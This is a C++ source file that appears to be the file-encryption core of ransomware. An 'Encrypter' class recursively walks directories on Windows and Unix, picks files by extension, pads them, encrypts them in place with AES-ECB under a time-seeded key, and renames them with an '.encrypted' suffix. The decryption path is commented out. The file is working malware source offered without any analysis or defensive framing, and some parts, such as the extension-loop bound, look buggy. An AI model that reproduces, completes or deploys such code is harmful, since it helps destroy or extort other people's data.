#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "../headers/aes.h"
#include "../headers/random.h"
#include "../headers/encrypter.h"

#ifdef _WIN32
#include <fileapi.h>
#else
#include <dirent.h>
#include <unistd.h>
#endif

bool isEncryptedFile(char* file) {
  char* ext = strrchr(file, '.');
  if (ext == NULL) return false;
  ext++;
  return strcmp(ext, "encrypted") == 0;
}
/*
void DecryptFile(char* fname, const uint8_t* key) {
  if (!isEncryptedFile(fname)) return;
  printf("Decrypting File: %s\n", fname);
  AES_stream_decrypt(fname, key);
  cant_files++;
  printf("File Decrypted!\n");
}
*/
bool isValidFile(char* file) {
  char* ext = strrchr(file, '.');
  if (ext == NULL) return false;
  ext++;
  bool res = false;
  for (int i = 0; i < (int)sizeof(extensions) && !res; i++)
    res = strcmp(ext, extensions[i]) == 0;
  return res;
}

/*
  To encrypt files using AES 256, the file size must be a multiple of 16 bytes
  This function adds 1 to 16 bytes to the file using ANSI X9.23 padding method
*/
void ANSI_X9_23(char* filename) {
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
  uint8_t* pad = new uint8_t[len];
  for (uint8_t i = 0; i < len - 1; i++)
    pad[i] = 0x00;
  pad[len - 1] = len;
  fwrite(pad, sizeof(uint8_t), len, file);
  rewind(file);
  fclose(file);
  delete[] pad;
}

Encrypter* Encrypter::instance = NULL;

Encrypter* Encrypter::getInstance() {
  if (instance == NULL)
    instance = new Encrypter();
  return instance;
}

Encrypter::Encrypter() {
  key = NULL;
  cant_encrypted = 0;
}

void Encrypter::destroyKey() {
  delete key;
  key = NULL;
}

void Encrypter::AES_stream_encrypt(char* filename) {
  AES_ctx ctx = AES_init_ctx(this->key);
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t* block = new uint8_t[AES_BLOCKLEN];
  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
    fseek(file, i, SEEK_SET);
    fread(block, 1, AES_BLOCKLEN, file);
    AES_ECB_encrypt(&ctx, block);
    fseek(file, i, SEEK_SET);
    fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, file);
  }
  delete[] block;
  fclose(file);
  // Add .encrypted extension
  char* dest = new char[strlen(filename) + 11];
  strcpy(dest, filename);
  strcat(dest, ".encrypted");
  rename(filename, dest);
  delete[] dest;
}

void Encrypter::AES_stream_decrypt(char* filename) {
  AES_ctx ctx = AES_init_ctx(this->key);
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t* block = new uint8_t[AES_BLOCKLEN];
  // Remove .encrypted extension
  char* dest = new char[strlen(filename) + 1];
  strcpy(dest, filename);
  char* lastdot = strrchr(dest, '.');
  *lastdot = '\0';
  FILE* destfile = fopen(dest, "wb");
  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
    fseek(file, i, SEEK_SET);
    fread(block, 1, AES_BLOCKLEN, file);
    AES_ECB_decrypt(&ctx, block);
    fseek(destfile, i, SEEK_SET);
    if (i < (size - AES_BLOCKLEN))
      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, destfile);
    else
      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN - block[AES_BLOCKLEN - 1], destfile);
  }
  delete[] block;
  delete[] dest;
  fclose(file);
  fclose(destfile);
  remove(filename);
}

void Encrypter::encryptFile(char* fname) {
  if (!isValidFile(fname)) return;
  printf("%s\n", fname);
  cant_encrypted++;

  ANSI_X9_23(fname);
  this->AES_stream_encrypt(fname);

  /*char* dest = new char[strlen(fname) + 11];
  strcpy(dest, fname);
  strcat(dest, ".encrypted");
  this->AES_stream_decrypt(dest);
  delete[] dest;*/
}

void Encrypter::generateKey(char* &id, unsigned int &len) {
  key = advandedRNG(id, len, time(NULL) ^ clock());
}

void Encrypter::encrypt(const char* sDir) {
  #ifdef _WIN32
  WIN32_FIND_DATA fdFile;
  HANDLE hFind = NULL;
  char sPath[512];
  sprintf(sPath, "%s\\*.*", sDir); // Search all files
  hFind = FindFirstFile(sPath, &fdFile);
  do {
    if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
      // Build up file path
      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
      // Is it a file or folder?
      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        this->encrypt(sPath); // Recursion
      else
        this->encryptFile(sPath);
    }
  } while (FindNextFile(hFind, &fdFile)); // Find the next file
  FindClose(hFind); // Clean
#else
  DIR* dir = opendir(sDir);
  dirent* entry = readdir(dir);
  char path[512];
  while (entry != NULL) {
    if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
      sprintf(path, "%s/%s", sDir, entry->d_name);  
      if (entry->d_type == DT_DIR)
        this->encrypt(path);
      else
        this->encryptFile(path);
    }
    entry = readdir(dir);
  }
  closedir(dir);
#endif
}

unsigned int Encrypter::getCantEncrypted() {
  return cant_encrypted;
}
